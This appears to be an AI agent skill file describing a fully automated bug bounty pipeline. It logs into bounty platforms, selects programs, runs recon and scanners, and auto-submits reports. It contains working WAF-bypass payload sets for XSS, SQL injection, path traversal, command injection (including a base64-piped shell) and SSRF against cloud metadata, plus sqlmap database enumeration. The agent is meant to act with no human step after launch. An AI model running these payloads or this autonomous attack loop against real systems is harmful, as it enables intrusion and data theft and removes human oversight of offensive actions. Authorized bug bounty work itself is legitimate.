---
name: bugbounty-automation
description: |
  Fully automated bug bounty pipeline. Logs into HackerOne, Bugcrowd, and OpenBugBounty via
  browser (prompted for sign-in), selects a program, extracts scope, runs multi-phase recon and
  vulnerability scanning at 1 RPS, detects WAF and applies bypass payloads, captures screenshot
  evidence for every confirmed finding, writes a structured report, and broadcasts real-time
  alerts + the final report to ALL configured channels (Discord, Telegram, WhatsApp, iMessage,
  Signal, etc.). Zero manual intervention after launch.
metadata:
  {
    "openclaw":
      {
        "emoji": "🐛",
        "requires":
          {
            "bins":
              [
                "python3",
                "nuclei",
                "subfinder",
                "httpx",
                "ffuf",
                "sqlmap",
                "wafw00f",
                "nmap",
                "curl",
              ],
          },
        "install":
          [
            {
              "id": "bb-macos",
              "kind": "shell",
              "cmd": "brew install nuclei subfinder httpx ffuf sqlmap wafw00f nmap && pip3 install requests httpx[cli] rich pyyaml playwright && playwright install chromium",
              "bins": ["nuclei", "subfinder", "httpx", "ffuf", "sqlmap", "wafw00f", "nmap"],
              "label": "Install bug bounty tools (macOS via brew)",
              "when": "platform == 'darwin'",
            },
            {
              "id": "bb-linux",
              "kind": "shell",
              "cmd": "sudo apt-get install -y nmap sqlmap wafw00f ffuf 2>/dev/null || true && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && pip3 install requests rich pyyaml playwright && playwright install chromium",
              "bins": ["nuclei", "subfinder", "httpx", "ffuf", "sqlmap", "wafw00f", "nmap"],
              "label": "Install bug bounty tools (Linux via apt + Go + pip)",
              "when": "platform == 'linux'",
            },
            {
              "id": "bb-windows",
              "kind": "shell",
              "cmd": "choco install nmap sqlmap ffuf -y && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && pip3 install requests rich pyyaml playwright && playwright install chromium",
              "bins": ["nuclei", "subfinder", "httpx", "ffuf", "sqlmap", "nmap"],
              "label": "Install bug bounty tools (Windows via choco + Go + pip)",
              "when": "platform == 'win32'",
            },
          ],
      },
  }
---

# Bug Bounty Automation — Zero-Touch Hunter

End-to-end automated bug bounty pipeline: program selection → recon → scanning → WAF bypass →
evidence capture → report → all-channel broadcast.

> [!IMPORTANT]
> Only test targets within the program's defined scope. Every test is rate-limited to **1 RPS** by
> default to stay within platform rules and avoid bans. Never exceed authorized scope.

---

## Pipeline Overview

```
┌─────────────────────────────────────────────────────────┐
│  PHASE 0  │  Browser Login (HackerOne/Bugcrowd/OBB)     │
├─────────────────────────────────────────────────────────┤
│  PHASE 1  │  Program Selection & Scope Extraction        │
├─────────────────────────────────────────────────────────┤
│  PHASE 2  │  Recon  (subdomains, live hosts, tech-fp)    │
├─────────────────────────────────────────────────────────┤
│  PHASE 3  │  WAF Detection + Bypass Payload Selection    │
├─────────────────────────────────────────────────────────┤
│  PHASE 4  │  Vuln Scan @ 1 RPS (nuclei, sqlmap, ffuf…)  │
├─────────────────────────────────────────────────────────┤
│  PHASE 5  │  Confirmation + Screenshot Evidence          │
├─────────────────────────────────────────────────────────┤
│  PHASE 6  │  Report Generation                           │
├─────────────────────────────────────────────────────────┤
│  PHASE 7  │  Broadcast All Channels                      │
└─────────────────────────────────────────────────────────┘
```

---

## Usage from Agent

```
Run the bug bounty automation pipeline on HackerOne — pick the best program and find all bugs
Start a bug bounty hunt on Bugcrowd, rate-limit to 1 RPS, notify all channels on every finding
Automate a full bug bounty run on OpenBugBounty and send me the report when done
Hunt bugs on HackerOne program example.com with WAF bypass payloads enabled
```

---

## Phase 0 — Browser Login

The agent opens the bug bounty platform in the browser and prompts you to sign in.
After login, the session is reused for all API and scope calls.

### HackerOne

```
[Agent → Browser]
1. Navigate to https://hackerone.com/users/sign_in
2. Prompt user: "Please sign in to HackerOne in the browser window."
3. Wait for redirect to dashboard (URL contains /dashboard or /reports)
4. Save session cookies for API calls
```

### Bugcrowd

```
[Agent → Browser]
1. Navigate to https://bugcrowd.com/user/sign_in
2. Prompt user: "Please sign in to Bugcrowd in the browser window."
3. Wait for redirect to /dashboard
4. Save session for scope API calls
```

### OpenBugBounty

```
[Agent → Browser]
1. Navigate to https://www.openbugbounty.org/login/
2. Prompt user: "Please sign in to OpenBugBounty in the browser window."
3. Wait for post-login redirect
4. Save session
```

---

## Phase 1 — Program Selection & Scope Extraction

After login the agent automatically selects the most suitable program:

### Selection Criteria (in priority order)

| Criterion           | Preference                                       |
| ------------------- | ------------------------------------------------ |
| Bounty availability | Programs with bounties (not VDP-only)            |
| Scope breadth       | Wildcard `*.domain.com` > single domain          |
| Recency             | Programs updated recently (active)               |
| Report velocity     | Lower competition = higher chance of unique bugs |
| Payout range        | Highest max critical bounty                      |

### HackerOne Program Selection

```python
# Fetch open programs with bounties, sorted by max payout
GET https://hackerone.com/programs.json?
  &product_type=bug-bounty
  &ordering=Highest+bounty
  &open_to_public=true

# Extract scope from chosen program
GET https://hackerone.com/{program-slug}/policy_scopes.json
# scope types: URL, WILDCARD, ANDROID_PACKAGE_NAME, etc.
# Only test scope_type IN_SCOPE, skip OUT_OF_SCOPE
```

### Bugcrowd Program Selection

```python
GET https://bugcrowd.com/programs.json?
  &reward_type=bounty
  &sort=promoted

# Extract targets from brief
GET https://bugcrowd.com/{program}/brief.json
# targets[].target — enumerate all in-scope
```

### OpenBugBounty Program Selection

```python
# Browse via scraping (no official API)
GET https://www.openbugbounty.org/bugbounty/
# Filter: latest added programs, select by domain count / reward info
```

---

## Phase 2 — Recon @ 1 RPS

All active recon tools are rate-limited to **1 request per second** per target host.

### 2a — Subdomain Enumeration (Passive First)

```bash
# Passive only first (no direct contact with target)
subfinder -d TARGET -o recon/subs.txt -silent -all

# Certificate transparency (no target contact)
curl -s "https://crt.sh/?q=%.TARGET&output=json" \
  | python3 -c "import json,sys;[print(r['name_value']) for r in json.load(sys.stdin)]" \
  | sort -u >> recon/subs.txt

# Deduplicate
sort -u recon/subs.txt -o recon/subs_all.txt
echo "[*] $(wc -l < recon/subs_all.txt) unique subdomains"
```

### 2b — Live Host Probing @ 1 RPS

```bash
# httpx with rate limit — 1 RPS per host
httpx -l recon/subs_all.txt \
  -rate-limit 1 \
  -tech-detect -title -status-code \
  -o recon/live.txt --json -o recon/live.json
```

### 2c — Technology Fingerprinting

```bash
# Whatweb for verbose tech fingerprint
whatweb --log-json=recon/tech.json \
  --wait=1 --max-threads=1 \
  $(cat recon/live.txt | tr '\n' ' ')
```

---

## Phase 3 — WAF Detection & Bypass

### 3a — Detect WAF

```bash
wafw00f https://TARGET -o recon/waf.txt -f json
```

WAF detection looks for:

- Cloudflare, Akamai, AWS WAF, Imperva, F5, Sucuri, ModSecurity, Barracuda

### 3b — WAF Bypass Payload Sets

If a WAF is detected, these bypass techniques are applied to **all payloads**:

#### XSS Bypass (WAF-aware)

```
<!-- Encoding bypasses -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>
<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>
<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">

<!-- Case / space mutation -->
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>
<img   src=x   onerror  =  alert(1)>

<!-- Protocol bypass -->
<a href="jAvAsCrIpT:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">x</a>

<!-- Comment obfuscation -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

#### SQLi Bypass (WAF-aware)

```sql
-- Case variation
SeLeCt * FrOm users WhErE id='1'

-- Inline comment injection
SE/**/LECT * FR/**/OM users

-- URL encoding
%53%45%4C%45%43%54 * FROM users

-- Double URL encoding
%2553%2545%254C%2545%2543%2554

-- Scientific notation (MySQL)
SELECT 1e0 UNION SELECT 1e0 FROM users

-- Whitespace alternatives (tab, newline)
SELECT%09*%09FROM%09users

-- MySQL-specific
SELECT/*!50000 * */FROM users
```

#### Path Traversal Bypass (WAF-aware)

```
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..\/..\/etc\/passwd
/..%00/..%00/etc/passwd
```

#### Command Injection Bypass (WAF-aware)

```bash
# IFS separator
${IFS}id

# Brace expansion
{cat,/etc/passwd}

# Variable substitution
$'i\144'

# Wildcard
/???/??d

# Base64 pipe
echo "aWQ=" | base64 -d | sh
```

#### SSRF Bypass (WAF-aware)

```
# IP encoding
http://2130706433/          # 127.0.0.1 as decimal
http://0x7f000001/          # 127.0.0.1 as hex
http://127.000.000.001/     # padded octets
http://[::1]/               # IPv6 loopback
http://localhost.localstack.cloud/  # DNS rebind

# AWS IMDS bypass
http://169.254.169.254/latest/meta-data/
http://[fd00:ec2::254]/latest/meta-data/
http://169.254.169.254@target.com/
```

---

## Phase 4 — Vulnerability Scanning @ 1 RPS

All scans use `--rate-limit 1` or equivalent. Tools are run **sequentially** per target
with a 1-second inter-request delay.

### 4a — Nuclei (CVE + Misconfiguration Scan)

```bash
nuclei -l recon/live.txt \
  -severity critical,high,medium \
  -rate-limit 1 \
  -bulk-size 1 \
  -concurrency 1 \
  -stats \
  -json -o findings/nuclei.json \
  -markdown-export findings/nuclei_report/
```

### 4b — SQL Injection (sqlmap)

```bash
# Per endpoint, with WAF bypass if detected
sqlmap -l recon/requests.txt \
  --batch \
  --level=3 --risk=2 \
  --delay=1 \
  --timeout=30 \
  --technique=BEUST \
  --tamper=space2comment,charencode,randomcase \
  --dbs \
  --json-output=findings/sqli.json

# WAF bypass tamper chain
# --tamper=between,charencode,space2comment,randomcase,equaltolike
```

### 4c — XSS (ffuf + dalfox)

```bash
# ffuf parameter fuzzing @ 1 RPS
ffuf -u "https://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -rate 1 \
  -mc 200,301,302 \
  -o findings/params.json

# dalfox XSS scan (with WAF bypass payloads)
dalfox url "https://TARGET" \
  --delay 1000 \
  --waf-bypass \
  --format json \
  -o findings/xss.json
```

### 4d — SSRF Detection

```bash
python3 - << 'EOF'
import requests, time, json

target = "TARGET"
callback = "https://YOURCOLLABORATOR.burpcollaborator.net"
ssrf_payloads = [
    f"http://127.0.0.1/",
    f"http://169.254.169.254/latest/meta-data/",
    f"http://[::1]/",
    f"{callback}/ssrf-test",
    f"http://0x7f000001/",
]
params_to_test = ["url", "redirect", "next", "target", "dest", "uri", "link", "src", "path"]

for param in params_to_test:
    for payload in ssrf_payloads:
        try:
            r = requests.get(f"https://{target}/", params={param: payload}, timeout=10)
            if any(x in r.text for x in ["root:", "ami-id", "instance-id"]):
                print(json.dumps({"type": "SSRF", "param": param, "payload": payload, "status": r.status_code}))
        except:
            pass
        time.sleep(1)  # 1 RPS
EOF
```

### 4e — Path Traversal

```bash
ffuf -u "https://TARGET/FUZZ" \
  -w findings/traversal_payloads.txt \
  -rate 1 \
  -mr "root:x|\\[boot loader\\]" \
  -o findings/traversal.json
```

### 4f — Open Redirect

```bash
ffuf -u "https://TARGET/?redirect=FUZZ" \
  -w /usr/share/seclists/Fuzzing/redirect-urls.txt \
  -rate 1 \
  -mr "Location: https://evil.com" \
  -o findings/redirects.json
```

### 4g — Subdomain Takeover

```bash
nuclei -l recon/subs_all.txt \
  -t takeovers/ \
  -rate-limit 1 \
  -json -o findings/takeovers.json
```

---

## Phase 5 — Confirmation & Screenshot Evidence

Every potential finding is confirmed and captured:

### Confirmation Flow

```
1. Detect anomaly (nuclei/ffuf/sqlmap output)
       ↓
2. Send PoC payload manually via exec/requests — confirm deterministic response
       ↓
3. Open in browser → take screenshot
       ↓
4. Save: evidence/CLAW-YYYY-NNN_[type]_[host]_screenshot.png
       ↓
5. Annotate screenshot: highlight the finding in the page
```

### Screenshot Capture

```python
# Browser screenshot of confirmed finding
browser.navigate("https://TARGET/vulnerable-endpoint?payload=CONFIRMED_PAYLOAD")
browser.screenshot("/evidence/FINDING_ID_screenshot.png")
```

### Evidence Package per Finding

```
evidence/
  CLAW-2026-001/
    request.txt          ← raw HTTP request
    response.txt         ← raw HTTP response
    screenshot.png       ← browser screenshot
    poc_command.sh       ← reproducible PoC
    nuclei_output.json   ← raw tool output
```

---

## Phase 6 — Report Generation

### Finding Format

````markdown
## CLAW-2026-001 — [SQL Injection in /api/search]

| Field            | Value                                               |
| ---------------- | --------------------------------------------------- |
| **Severity**     | CRITICAL                                            |
| **CVSS**         | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)           |
| **CWE**          | CWE-89                                              |
| **OWASP**        | A03:2021 Injection                                  |
| **ATT&CK**       | T1190                                               |
| **Host**         | api.example.com                                     |
| **Endpoint**     | /api/search?q=                                      |
| **WAF Bypassed** | Yes (Cloudflare — tamper: space2comment,charencode) |

### Description

SQL injection in the `q` parameter allows an unauthenticated attacker to dump the entire database.

### Reproduction (PoC)

```bash
sqlmap -u "https://api.example.com/api/search?q=1" --dbs --batch --delay=1
```
````

### Evidence

![Screenshot](evidence/CLAW-2026-001/screenshot.png)

**Extracted data:**

```
Database: app_db
Tables: users, payments, sessions
[*] users: 15,423 rows
```

### Business Impact

Full database exfiltration. All user credentials, PII, and payment records exposed.

### Remediation

Use parameterized queries. Do not concatenate user input into SQL strings.

````

### Auto-Submit to Platform

```python
# HackerOne API submission
POST https://api.hackerone.com/v1/hackers/reports
{
  "data": {
    "type": "report",
    "attributes": {
      "team_handle": "PROGRAM_HANDLE",
      "title": "SQL Injection in /api/search — Full DB Exfil",
      "vulnerability_information": "...",
      "severity_rating": "critical",
      "impact": "...",
      "weakness_id": 89
    }
  }
}
# Attach screenshots as assets
````

---

## Phase 7 — All-Channel Broadcast

### Real-Time Finding Alert (per finding found)

```
🐛 BUG FOUND — CLAW-2026-001
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Platform:   HackerOne / example.com
Type:       SQL Injection
Severity:   🔴 CRITICAL (CVSS 9.8)
Endpoint:   /api/search?q=
WAF:        Cloudflare ✅ (bypassed)
Evidence:   [screenshot attached]

Report submitted to HackerOne ✅
```

Broadcast channels:

- Discord (+ screenshot embed)
- Telegram (+ screenshot)
- WhatsApp
- iMessage
- Signal
- Any other configured channel

### Final Report Broadcast (end of run)

```
📋 BUG BOUNTY RUN COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Platform:      HackerOne
Program:       example.com
Duration:      3h 42m
Targets:       47 live hosts scanned
Rate:          1 RPS throughout

Findings:
  🔴 CRITICAL: 1  (CLAW-2026-001 — SQLi)
  🟠 HIGH:     3  (XSS, SSRF, Open Redirect)
  🟡 MEDIUM:   8
  🔵 LOW:      5

WAF detected:  Cloudflare → bypassed ✅
Reports filed: 4 submitted to HackerOne

Full report + evidence: /reports/2026-02-23_example.com.md
```

---

## Config

Set HackerOne API credentials for auto-submission:

```json5
{
  env: {
    HACKERONE_USERNAME: "your_username",
    HACKERONE_API_TOKEN: "your_api_token",
    BUGCROWD_EMAIL: "your_email",
    BUGCROWD_PASSWORD: "stored_in_credentials",
    OBB_USERNAME: "your_username",
  },
}
```

## Rate Limiting Config

All tools default to **1 RPS**. Override per-run:

```
Run bug bounty on HackerOne at 0.5 RPS (extra cautious)
Run bug bounty on Bugcrowd at 2 RPS (if program allows)
```

> [!CAUTION]
> Never exceed program-specified rate limits. Getting banned = losing future earnings.
> Default 1 RPS is safe for all platforms. Never set above 5 RPS without explicit program permission.

## Safety Rules

1. **Scope check before every request** — verify the target is IN_SCOPE before testing
2. **No destructive tests** — no account deletion, no data destruction, no DoS payloads
3. **No PII access beyond proof** — stop at confirmation, do not bulk-exfiltrate
4. **Rate limit: 1 RPS default** — always
5. **Report before disclosing** — submit to platform before sharing externally

## Usage from Agent

```
Start a full automated bug bounty hunt on HackerOne — best available program
Run bug bounty automation on Bugcrowd with WAF bypass enabled, notify all channels
Hunt on OpenBugBounty and submit any findings automatically
Run bug bounty on HackerOne program shopify, 1 RPS, send me alerts on Discord when you find something
Give me a summary of the last bug bounty run results
```
